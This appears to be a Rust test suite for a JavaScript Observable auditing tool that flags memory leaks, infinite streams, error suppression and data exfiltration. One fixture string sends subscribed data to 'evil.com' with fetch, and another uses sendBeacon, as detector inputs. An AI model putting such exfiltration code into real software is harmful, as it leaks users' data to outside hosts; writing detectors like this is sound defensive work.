use crate::observable_audit::*;

#[test]
fn test_no_observable_api() {
    let body = "const x = 42; console.log(x);";
    let issues = analyze_observable(body);
    assert!(issues.is_empty());
}

#[test]
fn test_observable_keyword_detected() {
    let body = "const stream = new Observable(subscriber => {});";
    let issues = analyze_observable(body);
    assert!(issues.contains(&ObservableIssue::ApiDetected));
}

#[test]
fn test_observable_lowercase_detected() {
    let body = "const obs = observable.from([1,2,3]);";
    let issues = analyze_observable(body);
    assert!(issues.contains(&ObservableIssue::ApiDetected));
}

#[test]
fn test_subscribe_keyword_detected() {
    let body = "stream.subscribe(value => console.log(value));";
    let issues = analyze_observable(body);
    assert!(issues.contains(&ObservableIssue::ApiDetected));
}

#[test]
fn test_subscriber_keyword_detected() {
    let body = "new Observable(Subscriber => { Subscriber.next(1); });";
    let issues = analyze_observable(body);
    assert!(issues.contains(&ObservableIssue::ApiDetected));
}

#[test]
fn test_memory_leak_subscribe_without_cleanup() {
    let body = "const obs = new Observable(); obs.subscribe(x => {});";
    let issues = analyze_observable(body);
    assert!(issues.contains(&ObservableIssue::MemoryLeak));
}

#[test]
fn test_memory_leak_with_unsubscribe() {
    let body = "const sub = obs.subscribe(x => {}); sub.unsubscribe();";
    let issues = analyze_observable(body);
    assert!(!issues.contains(&ObservableIssue::MemoryLeak));
}

#[test]
fn test_memory_leak_with_complete() {
    let body = "new Observable(s => { s.complete(); }).subscribe();";
    let issues = analyze_observable(body);
    assert!(!issues.contains(&ObservableIssue::MemoryLeak));
}

#[test]
fn test_infinite_stream_interval() {
    let body = "Observable.interval(1000).subscribe(x => {});";
    let issues = analyze_observable(body);
    assert!(issues.contains(&ObservableIssue::InfiniteStream));
}

#[test]
fn test_infinite_stream_with_take() {
    let body = "Observable.interval(1000).take(10).subscribe();";
    let issues = analyze_observable(body);
    assert!(!issues.contains(&ObservableIssue::InfiniteStream));
}

#[test]
fn test_infinite_stream_with_take_until() {
    let body = "stream.takeUntil(cancel$).subscribe();";
    let issues = analyze_observable(body);
    assert!(!issues.contains(&ObservableIssue::InfiniteStream));
}

#[test]
fn test_side_effect_exfiltration_fetch() {
    let body = "obs.subscribe(data => { fetch('https://evil.com', {body: data}); });";
    let issues = analyze_observable(body);
    assert!(issues.contains(&ObservableIssue::SideEffectExfiltration));
}

#[test]
fn test_side_effect_exfiltration_send_beacon() {
    let body = "stream.subscribe(x => navigator.sendBeacon('/log', x));";
    let issues = analyze_observable(body);
    assert!(issues.contains(&ObservableIssue::SideEffectExfiltration));
}

#[test]
fn test_error_suppression_catch_without_throw() {
    let body = "obs.subscribe(x => {}, err => { catch(err); });";
    let issues = analyze_observable(body);
    assert!(issues.contains(&ObservableIssue::ErrorSuppression));
}

#[test]
fn test_error_suppression_with_throw() {
    let body = "obs.subscribe(x => {}, error => { throw error; });";
    let issues = analyze_observable(body);
    assert!(!issues.contains(&ObservableIssue::ErrorSuppression));
}

#[test]
fn test_error_suppression_with_console_error() {
    let body = "stream.subscribe(v => {}, e => console.error(e));";
    let issues = analyze_observable(body);
    assert!(!issues.contains(&ObservableIssue::ErrorSuppression));
}

#[test]
fn test_observable_severity_values() {
    assert_eq!(observable_severity(&ObservableIssue::ApiDetected), 2.0);
    assert_eq!(observable_severity(&ObservableIssue::MemoryLeak), 6.5);
    assert_eq!(observable_severity(&ObservableIssue::InfiniteStream), 6.0);
    assert_eq!(observable_severity(&ObservableIssue::SideEffectExfiltration), 7.0);
    assert_eq!(observable_severity(&ObservableIssue::ErrorSuppression), 5.5);
}

#[test]
fn test_observable_to_operations() {
    let issues = vec![
        ObservableIssue::ApiDetected,
        ObservableIssue::MemoryLeak,
    ];
    let mut seq = 100;
    let ops = observable_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 102);
}

#[test]
fn test_observable_display() {
    assert_eq!(format!("{}", ObservableIssue::ApiDetected), "observable_api_detected");
    assert_eq!(format!("{}", ObservableIssue::MemoryLeak), "observable_memory_leak");
    assert_eq!(format!("{}", ObservableIssue::InfiniteStream), "observable_infinite_stream");
    assert_eq!(format!("{}", ObservableIssue::SideEffectExfiltration), "observable_side_effect_exfiltration");
    assert_eq!(format!("{}", ObservableIssue::ErrorSuppression), "observable_error_suppression");
}
